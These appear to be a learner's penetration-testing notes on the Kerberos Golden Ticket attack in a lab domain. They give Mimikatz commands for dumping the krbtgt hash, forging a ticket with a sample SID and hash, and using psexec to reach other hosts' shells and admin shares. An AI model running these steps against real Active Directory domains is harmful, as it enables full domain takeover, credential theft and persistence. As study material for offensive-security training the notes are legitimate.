#SID #krbtgt #mimikatz #psexec  

Once we have the SID and krbtgt hash, we can generate a ticket  
# What is it?

- When we compromise the krbtgt account, we own the domain
- We can request access to any resource or system on the domain  
- Golden tickets == complete access to every machine

We can utilize Mimikatz toobtain the information necessary to perform this attack

`mimikatz.exe`​
`privilege::debug`​
`lsadump::lsa /inject /name:krbtgt`​

- dumps the information for the krbtgt account
- need:
	- krbtgt ntlm hash
	- domain SID  

Once we have the SID and krbtgt hash, we can generate a ticket (in mimikatz)  

`kerberos::golden /User:Administrator /domain:marvel.local /sid:5-1-5-21-1906906745-4001022521-2301571936 /krbtgt:ece475c9f4435447d31a6cad2b49e5a6 /id:500 /ptt`​

- /User can be a fake user, /domain must be real  

`misc::cmd`​

With a Golden Ticket, we can now access other machines from the cmd line

`dir \\10.0.0.25\C$   `
`dir \\THEPUNISHER\C$`​​​
`Exec64.exe \\10.0.0.25 cmd.exe`​
`psexec.exe \\THEPUNISHER cmd.exe`
- (psexec.exe is a Windows tool.run it in the Golden Ticket session against another domain user/account to get a shell)
`whoami`​
`hostname`​

Golden Ticket is persistence. Silver Ticket is stealthier than Golden Ticket.  

